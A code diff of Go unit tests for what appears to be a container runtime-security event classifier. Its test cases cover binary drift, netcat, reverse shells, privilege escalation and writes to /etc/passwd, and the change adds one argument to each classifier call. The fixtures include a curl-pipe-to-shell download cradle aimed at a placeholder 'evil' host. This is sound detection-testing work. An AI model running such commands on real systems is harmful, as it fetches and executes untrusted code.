@@ -80,23 +80,23 @@ func TestEventsIngest_ProvenanceDrift(t *testing.T) {
 	ev := &IngestEvent{Kind: "process_exec", Comm: "curl", Filename: "/usr/bin/curl", WorkloadID: "default/api"}
 
 	// enforce: drift of a non-baselined, non-shell binary -> high/block (Protect).
-	cls := mk(baseline.ModeEnforce).classifyEvent(orgID, ev, nil, false)
+	cls := mk(baseline.ModeEnforce).classifyEvent(orgID, uuid.Nil, ev, nil, false)
 	if cls.Severity != "high" || cls.Verdict != "block" || cls.Reason != "provenance-drift" {
 		t.Fatalf("enforce drift = %+v", cls)
 	}
 	// monitor: same drift -> medium/alert.
-	cls = mk(baseline.ModeMonitor).classifyEvent(orgID, ev, nil, false)
+	cls = mk(baseline.ModeMonitor).classifyEvent(orgID, uuid.Nil, ev, nil, false)
 	if cls.Severity != "medium" || cls.Verdict != "alert" || cls.Reason != "provenance-drift" {
 		t.Fatalf("monitor drift = %+v", cls)
 	}
 	// learn: no drift signal.
-	cls = mk(baseline.ModeLearn).classifyEvent(orgID, ev, nil, false)
+	cls = mk(baseline.ModeLearn).classifyEvent(orgID, uuid.Nil, ev, nil, false)
 	if cls.Severity != "info" || cls.Reason != "" {
 		t.Fatalf("learn drift should be info, got %+v", cls)
 	}
 	// baselined binary in enforce -> info (in allow-set).
 	in := &IngestEvent{Kind: "process_exec", Comm: "nginx", Filename: "/usr/sbin/nginx", WorkloadID: "default/api"}
-	cls = mk(baseline.ModeEnforce).classifyEvent(orgID, in, nil, false)
+	cls = mk(baseline.ModeEnforce).classifyEvent(orgID, uuid.Nil, in, nil, false)
 	if cls.Severity != "info" {
 		t.Fatalf("baselined binary should be info, got %+v", cls)
 	}
@@ -117,7 +117,7 @@ func TestEventsIngest_AgentZeroDrift(t *testing.T) {
 		Kind: "process_exec", Comm: "evil", Filename: "/tmp/evil",
 		WorkloadID: "default/api", ZeroDriftReason: "zero-drift:image-drift",
 	}
-	cls := h.classifyEvent(orgID, mon, nil, false)
+	cls := h.classifyEvent(orgID, uuid.Nil, mon, nil, false)
 	if cls.Severity != "medium" || cls.Verdict != "alert" || cls.Reason != "zero-drift:image-drift" {
 		t.Fatalf("monitor zero-drift = %+v, want medium/alert/zero-drift:image-drift", cls)
 	}
@@ -127,7 +127,7 @@ func TestEventsIngest_AgentZeroDrift(t *testing.T) {
 		Kind: "process_exec", Comm: "evil", Filename: "/tmp/evil",
 		WorkloadID: "default/api", ZeroDriftReason: "zero-drift:unanchored", Blocked: true,
 	}
-	cls = h.classifyEvent(orgID, blk, nil, false)
+	cls = h.classifyEvent(orgID, uuid.Nil, blk, nil, false)
 	if cls.Severity != "high" || cls.Verdict != "block" || cls.Reason != "zero-drift:unanchored" {
 		t.Fatalf("blocked zero-drift = %+v, want high/block/zero-drift:unanchored", cls)
 	}
@@ -143,7 +143,7 @@ func TestEventsIngest_AgentZeroDrift(t *testing.T) {
 		Kind: "process_exec", Comm: "nc", WorkloadID: "default/api",
 		ZeroDriftReason: "zero-drift:image-drift",
 	}
-	if cls = h.classifyEvent(orgID, sus, nil, false); cls.Reason != "suspicious-binary" {
+	if cls = h.classifyEvent(orgID, uuid.Nil, sus, nil, false); cls.Reason != "suspicious-binary" {
 		t.Fatalf("server detection should win over agent tag, got %+v", cls)
 	}
 }
@@ -156,7 +156,7 @@ func TestEventsIngest_SuspiciousBinary(t *testing.T) {
 	h := NewEventsIngest(nil, nil, func(_ uuid.UUID, _ string) (baseline.Mode, map[string]struct{}, bool) {
 		return baseline.ModeLearn, map[string]struct{}{"nc": {}}, true
 	})
-	cls := h.classifyEvent(orgID, &IngestEvent{Kind: "process_exec", Comm: "nc", WorkloadID: "default/api"}, nil, false)
+	cls := h.classifyEvent(orgID, uuid.Nil, &IngestEvent{Kind: "process_exec", Comm: "nc", WorkloadID: "default/api"}, nil, false)
 	if cls.Severity != "high" || cls.Verdict != "alert" || cls.Reason != "suspicious-binary" {
 		t.Fatalf("netcat exec = %+v", cls)
 	}
@@ -165,7 +165,7 @@ func TestEventsIngest_SuspiciousBinary(t *testing.T) {
 	}
 
 	// A curl|sh download-cradle in argv is suspicious even though curl alone is not.
-	cls = h.classifyEvent(orgID, &IngestEvent{
+	cls = h.classifyEvent(orgID, uuid.Nil, &IngestEvent{
 		Kind: "process_exec", Comm: "sh", WorkloadID: "default/api",
 		Args: []string{"sh", "-c", "curl -s http://evil/x | sh"},
 	}, nil, false)
@@ -187,7 +187,7 @@ func TestEventsIngest_PrivilegeEscalation(t *testing.T) {
 	if !privEscFromBatch(&batch[1], uidByPID) {
 		t.Fatal("expected privesc for root child of non-root parent")
 	}
-	cls := h.classifyEvent(orgID, &batch[1], nil, privEscFromBatch(&batch[1], uidByPID))
+	cls := h.classifyEvent(orgID, uuid.Nil, &batch[1], nil, privEscFromBatch(&batch[1], uidByPID))
 	if cls.Severity != "high" || cls.Verdict != "alert" || cls.Reason != "privilege-escalation" {
 		t.Fatalf("privesc = %+v", cls)
 	}
@@ -210,7 +210,7 @@ func TestEventsIngest_ReverseShellAndRealUIDEscalation(t *testing.T) {
 
 	// Reverse shell: bash with stdio redirected to a socket -> high / reverse-shell.
 	rev := &IngestEvent{Kind: "process_exec", Comm: "bash", WorkloadID: "default/api", StdioSocket: true}
-	cls := h.classifyEvent(orgID, rev, nil, false)
+	cls := h.classifyEvent(orgID, uuid.Nil, rev, nil, false)
 	if cls.Severity != "high" || cls.Verdict != "alert" || cls.Reason != "reverse-shell" {
 		t.Fatalf("reverse-shell = %+v", cls)
 	}
@@ -220,14 +220,14 @@ func TestEventsIngest_ReverseShellAndRealUIDEscalation(t *testing.T) {
 
 	// StdioSocket on a benign, non-shell, non-suspicious exec is NOT a reverse shell.
 	benign := &IngestEvent{Kind: "process_exec", Comm: "nginx", WorkloadID: "default/api", StdioSocket: true}
-	if cls := h.classifyEvent(orgID, benign, nil, false); cls.Reason == "reverse-shell" {
+	if cls := h.classifyEvent(orgID, uuid.Nil, benign, nil, false); cls.Reason == "reverse-shell" {
 		t.Fatalf("benign socket-stdio exec wrongly flagged: %+v", cls)
 	}
 
 	// Real-uid escalation: euid 0 with a non-root real uid (sudo / setuid) -> high.
 	esc := &IngestEvent{Kind: "process_exec", Comm: "id", WorkloadID: "default/api",
 		UID: 0, Ruid: 1000, RuidKnown: true}
-	cls = h.classifyEvent(orgID, esc, nil, false)
+	cls = h.classifyEvent(orgID, uuid.Nil, esc, nil, false)
 	if cls.Severity != "high" || cls.Verdict != "alert" || cls.Reason != "real-uid-escalation" {
 		t.Fatalf("real-uid escalation = %+v", cls)
 	}
@@ -245,7 +245,7 @@ func TestEventsIngest_ReverseShellAndRealUIDEscalation(t *testing.T) {
 	// Backward compatible: an exec WITHOUT the new fields classifies exactly as before
 	// (a bare shell exec in a baseline-unknown workload is medium, not high).
 	old := &IngestEvent{Kind: "process_exec", Comm: "bash", WorkloadID: "default/api"}
-	if cls := h.classifyEvent(orgID, old, nil, false); cls.Severity != "medium" || cls.Reason != "" {
+	if cls := h.classifyEvent(orgID, uuid.Nil, old, nil, false); cls.Severity != "medium" || cls.Reason != "" {
 		t.Fatalf("absent enrichment changed classification: %+v", cls)
 	}
 }
@@ -255,7 +255,7 @@ func TestEventsIngest_FIMDefaultWrite(t *testing.T) {
 	orgID := uuid.New()
 	h := NewEventsIngest(nil, nil, nil)
 	// Write (O_WRONLY) to /etc/passwd.
-	cls := h.classifyEvent(orgID, &IngestEvent{
+	cls := h.classifyEvent(orgID, uuid.Nil, &IngestEvent{
 		Kind: "file_open", WorkloadID: "default/api", Path: "/etc/passwd", Flags: oWRONLY | oCREAT,
 	}, &fileProfileRuleSet{}, false)
 	if cls.FIM == nil || cls.Severity != "high" || cls.Verdict != "alert" || cls.Reason != "fim-default" {
@@ -266,7 +266,7 @@ func TestEventsIngest_FIMDefaultWrite(t *testing.T) {
 	}
 
 	// A read-only open of /etc/passwd is NOT a FIM modification (covered by read-sensitive).
-	cls = h.classifyEvent(orgID, &IngestEvent{
+	cls = h.classifyEvent(orgID, uuid.Nil, &IngestEvent{
 		Kind: "file_open", WorkloadID: "default/api", Path: "/etc/passwd", Flags: 0, // O_RDONLY
 	}, &fileProfileRuleSet{}, false)
 	if cls.FIM != nil || cls.Severity != "info" {
@@ -274,7 +274,7 @@ func TestEventsIngest_FIMDefaultWrite(t *testing.T) {
 	}
 
 	// A write to an unwatched path is info.
-	cls = h.classifyEvent(orgID, &IngestEvent{
+	cls = h.classifyEvent(orgID, uuid.Nil, &IngestEvent{
 		Kind: "file_open", WorkloadID: "default/api", Path: "/tmp/scratch", Flags: oWRONLY,
 	}, &fileProfileRuleSet{}, false)
 	if cls.FIM != nil || cls.Severity != "info" {
@@ -282,7 +282,7 @@ func TestEventsIngest_FIMDefaultWrite(t *testing.T) {
 	}
 
 	// A write to a system bin dir (binary tamper) is high.
-	cls = h.classifyEvent(orgID, &IngestEvent{
+	cls = h.classifyEvent(orgID, uuid.Nil, &IngestEvent{
 		Kind: "file_open", WorkloadID: "default/api", Path: "/usr/bin/curl", Flags: oRDWR,
 	}, &fileProfileRuleSet{}, false)
 	if cls.FIM == nil || cls.Severity != "high" {
